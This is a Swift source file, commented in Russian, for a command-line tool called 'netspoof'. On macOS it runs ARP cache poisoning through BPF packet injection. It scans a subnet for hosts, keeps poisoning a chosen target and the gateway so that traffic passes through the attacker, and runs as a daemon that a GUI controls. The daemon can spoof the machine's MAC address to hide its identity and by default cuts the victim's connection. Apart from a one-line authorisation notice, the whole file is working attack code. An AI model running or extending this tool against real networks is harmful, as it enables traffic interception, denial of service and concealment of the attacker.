import Foundation
import ARPSpoofCore

setbuf(stdout, nil)  // живой лог без буферизации (serve пишет в файл, а не в tty)

// Глобальный флаг остановки — выставляется из обработчика сигнала.
var gStop: sig_atomic_t = 0

// Если маскировали MAC — что вернуть при выходе (интерфейс, оригинальный MAC).
var macRestore: (iface: String, mac: MACAddress)? = nil

func handleSignal(_ s: Int32) {
    gStop = 1
}

// Запрос интерфейса с ожиданием: после смены MAC (down/up) Wi-Fi пере-
// ассоциируется и IP возвращается не сразу. Ждём до ~12с.
func queryInterfaceWaiting(_ iface: String, attempts: Int = 24) throws -> InterfaceInfo {
    for i in 0..<attempts {
        if let info = try? queryInterface(iface) { return info }
        if i < attempts - 1 { usleep(500_000) }
    }
    return try queryInterface(iface)  // финальная попытка пробросит ошибку
}

func fail(_ msg: String) -> Never {
    FileHandle.standardError.write(Data(("error: " + msg + "\n").utf8))
    exit(1)
}

func usage() -> Never {
    let text = """
    netspoof — нативный аналог arpspoof для macOS (BPF packet injection).
    Только для сетей, которыми вы владеете или на которые есть письменное разрешение.

    Использование:
      sudo netspoof scan  -i <iface>
      sudo netspoof spoof -i <iface> -t <mac|ip> [-g <gateway-ip>]
                          [--oneway] [--interval <ms>] [--no-forward]
      sudo netspoof serve -i <iface> [--socket <path>] [-g <gateway-ip>]
                          [--oneway] [--interval <ms>] [--no-forward]

    Команды:
      scan    ARP-скан подсети: перечислить живые хосты (IP + MAC + вендор).
      spoof   Отравить ARP-кэш цели (MITM через этот Mac). Цель — по MAC.
      serve   Демон: unix-сокет + JSON для GUI (scan/start/stop/stopAll/status).

    Опции spoof:
      -t, --target     цель: MAC (рекомендуется, стабилен) или IP
      -g, --gateway    IP шлюза (по умолчанию — маршрут по умолчанию)
      --oneway         травить только цель, не шлюз
      --interval <ms>  период переотправки (по умолчанию 2000)
      --no-forward     не включать net.inet.ip.forwarding (трафик цели прервётся)
    """
    print(text)
    exit(2)
}

// --- Разбор аргументов ---
var args = Array(CommandLine.arguments.dropFirst())
guard let command = args.first else { usage() }
args.removeFirst()

func optValue(_ names: [String]) -> String? {
    for name in names {
        if let idx = args.firstIndex(of: name), idx + 1 < args.count {
            return args[idx + 1]
        }
    }
    return nil
}
func hasFlag(_ name: String) -> Bool { args.contains(name) }

guard let iface = optValue(["-i", "--iface"]) ?? activeInterface() else {
    fail("не удалось определить интерфейс — укажите через -i (например, -i en0)")
}

if geteuid() != 0 {
    fail("нужны права root — запускайте через sudo")
}

// MAC-mask (--mask-mac): до запроса интерфейса подменяем свой MAC, чтобы скрыть
// личность устройства. Проверяем, что реально закрепилось; при выходе вернём.
// На встроенном Wi-Fi Apple Silicon смена MAC не держится (драйвер откатывает при
// реассоциации), поэтому там даже не пытаемся — иначе зря рвём связь на каждом старте.
if command == "serve", hasFlag("--mask-mac") {
    if MACMasker.isWiFi(iface) {
        Log.warn("mask: интерфейс \(iface) — Wi-Fi; на встроенном Wi-Fi (Apple Silicon) смена "
            + "MAC не закрепляется. Пропускаю (связь не дёргаю), работаю с реальным MAC. "
            + "Для маскировки используйте USB-Ethernet.")
    } else if let orig = MACMasker.current(iface) {
        let masked = MACMasker.plausible()
        Log.info("mask: меняю MAC \(orig) → \(masked)…")
        if MACMasker.apply(iface, masked) {
            macRestore = (iface, orig)
            Log.info("mask: OK — MAC закреплён (\(masked))")
        } else {
            let now = MACMasker.current(iface).map { "\($0)" } ?? "?"
            Log.warn("mask: НЕ применился (ОС откатила) — работаю с реальным MAC \(now)")
        }
    } else {
        Log.warn("mask: не удалось прочитать текущий MAC — маскировка пропущена")
    }
}

let info: InterfaceInfo
do {
    info = try queryInterfaceWaiting(iface)
} catch {
    fail("\(error)")
}

switch command {
case "scan":
    let bpf: BPFDevice
    do { bpf = try BPFDevice(interface: iface) } catch { fail("\(error)") }
    let spoofer = ARPSpoofer(iface: info, bpf: bpf)

    print("Сканирую подсеть на \(iface) (\(info.ip), MAC \(info.mac))...")
    let results = spoofer.scan()
    print("Найдено хостов: \(results.count)")
    for h in results {
        let ipCol = h.ip.description.padding(toLength: 16, withPad: " ", startingAt: 0)
        let macCol = h.mac.description.padding(toLength: 19, withPad: " ", startingAt: 0)
        print("  \(ipCol)\(macCol)\(h.vendor)")
    }

case "spoof":
    guard let targetStr = optValue(["-t", "--target"]) else {
        fail("укажите цель через -t (MAC aa:bb:cc:dd:ee:ff или IPv4)")
    }

    let gatewayIP: IPv4Address
    if let g = optValue(["-g", "--gateway"]), let parsed = IPv4Address(g) {
        gatewayIP = parsed
    } else if let def = gatewayGuess(for: info) {
        gatewayIP = def
    } else {
        fail("не удалось определить шлюз — задайте явно через -g")
    }

    let oneway = hasFlag("--oneway")
    let noForward = hasFlag("--no-forward")
    let intervalMS = Int(optValue(["--interval"]) ?? "2000") ?? 2000

    let bpf: BPFDevice
    do { bpf = try BPFDevice(interface: iface) } catch { fail("\(error)") }
    let spoofer = ARPSpoofer(iface: info, bpf: bpf)

    print("Интерфейс: \(iface)  IP: \(info.ip)  MAC: \(info.mac)")
    print("Шлюз:      \(gatewayIP)")

    let gatewayMAC: MACAddress
    do {
        print("Разрешаю MAC шлюза...")
        gatewayMAC = try spoofer.resolveMAC(ip: gatewayIP)
        print("  шлюз  \(gatewayIP) -> \(gatewayMAC)")
    } catch {
        fail("\(error)")
    }

    // Цель фиксируется по MAC (стабилен), текущий IP отслеживается вживую.
    let targetMAC: MACAddress
    var currentIP: IPv4Address?
    if let mac = MACAddress(targetStr) {
        targetMAC = mac
        print("Цель (MAC): \(mac) — ищу текущий IP...")
        currentIP = spoofer.resolveIP(forMAC: mac)
        print(currentIP.map { "  \(mac) сейчас на \($0)" } ?? "  IP пока не найден — поищу в фоне")
    } else if let ip = IPv4Address(targetStr) {
        do {
            print("Цель (IP): \(ip) — разрешаю MAC...")
            targetMAC = try spoofer.resolveMAC(ip: ip)
            currentIP = ip
            print("  \(ip) -> \(targetMAC) (дальше привязка к MAC)")
        } catch {
            fail("\(error)")
        }
    } else {
        fail("-t: ожидается MAC (aa:bb:cc:dd:ee:ff) или IPv4-адрес")
    }

    // IP forwarding: чтобы быть прозрачным MITM, а не рвать связь.
    var enabledForwarding = false
    if !noForward {
        if getIPForwarding() != 1 {
            if setIPForwarding(true) {
                enabledForwarding = true
                print("Включил net.inet.ip.forwarding")
            } else {
                print("warning: не удалось включить ip forwarding")
            }
        }
    }

    signal(SIGINT, handleSignal)
    signal(SIGTERM, handleSignal)

    print("Травлю ARP-кэш (привязка к \(targetMAC)). Ctrl-C — остановить и восстановить.")
    var lastRescan = Date()
    while gStop == 0 {
        // Живое отслеживание: обновляем текущий IP цели из ARP-трафика.
        for f in bpf.receive(timeoutMS: 150) {
            if let (m, ip) = parseARPSender(f), m == targetMAC, currentIP != ip {
                print("IP цели изменился: \(currentIP.map { "\($0)" } ?? "—") -> \(ip)")
                currentIP = ip
            }
        }
        // Если IP ещё неизвестен — периодически пересканируем подсеть.
        if currentIP == nil, Date().timeIntervalSince(lastRescan) > 5 {
            currentIP = spoofer.resolveIP(forMAC: targetMAC, timeout: 1.5)
            if let ip = currentIP { print("Нашёл цель: \(targetMAC) на \(ip)") }
            lastRescan = Date()
        }
        if let ip = currentIP {
            spoofer.poisonOnce(victimIP: ip, victimMAC: targetMAC,
                               gatewayIP: gatewayIP, gatewayMAC: gatewayMAC,
                               oneway: oneway)
        }
        usleep(UInt32(max(100, intervalMS) * 1000))
    }

    print("\nВосстанавливаю ARP-кэш...")
    if let ip = currentIP {
        spoofer.restore(victimIP: ip, victimMAC: targetMAC,
                        gatewayIP: gatewayIP, gatewayMAC: gatewayMAC)
    }
    if enabledForwarding {
        setIPForwarding(false)
        print("Выключил ip forwarding")
    }
    print("Готово.")

case "serve":
    // Единственный экземпляр: убираем прежних демонов-сирот (мы root).
    killOtherNetspoofInstances()
    let socketPath = optValue(["--socket"]) ?? "/tmp/netspoof.sock"
    let oneway = hasFlag("--oneway")
    let noForward = hasFlag("--no-forward")
    let intervalMS = Int(optValue(["--interval"]) ?? "2000") ?? 2000

    let gatewayIP: IPv4Address
    if let g = optValue(["-g", "--gateway"]), let parsed = IPv4Address(g) {
        gatewayIP = parsed
    } else if let def = gatewayGuess(for: info) {
        gatewayIP = def
    } else {
        fail("не удалось определить шлюз — задайте явно через -g")
    }

    let bpf: BPFDevice
    do { bpf = try BPFDevice(interface: iface) } catch { fail("\(error)") }
    let spoofer = ARPSpoofer(iface: info, bpf: bpf)

    let gatewayMAC: MACAddress
    do {
        Log.info("serve: разрешаю MAC шлюза \(gatewayIP)...")
        gatewayMAC = try spoofer.resolveMAC(ip: gatewayIP)
    } catch {
        fail("\(error)")
    }

    let engine = SpoofEngine(spoofer: spoofer, gatewayIP: gatewayIP,
                             gatewayMAC: gatewayMAC, oneway: oneway)
    // По умолчанию cut (forwarding off → цель теряет связь); --intercept — прозрачный MITM.
    let fwd = ForwardingControl(cutMode: noForward || !hasFlag("--intercept"))

    let owner = optValue(["--owner"])
    guard let listenFD = makeListeningSocket(path: socketPath, owner: owner) else {
        fail("не удалось открыть сокет \(socketPath)")
    }
    signal(SIGINT, handleSignal)
    signal(SIGTERM, handleSignal)

    Log.info("serve: слушаю \(socketPath) · iface \(iface) · gw \(gatewayIP) (\(gatewayMAC))")
    let state = ServeState()
    state.masked = (macRestore != nil)
    runServe(info: info, engine: engine, bpf: bpf,
             listenFD: listenFD, intervalMS: intervalMS, fwd: fwd, state: state)

    engine.stopAll()
    fwd.disableIfEnabled()
    close(listenFD)
    unlink(socketPath)
    if let r = macRestore {
        Log.info("mask: восстанавливаю оригинальный MAC \(r.mac)…")
        _ = MACMasker.apply(r.iface, r.mac)
    }
    if bpf.sendFailures > 0 {
        Log.warn("serve: сбоев отправки BPF за сессию: \(bpf.sendFailures)")
    }
    Log.info("serve: остановлен, ARP-кэши восстановлены.")

default:
    usage()
}
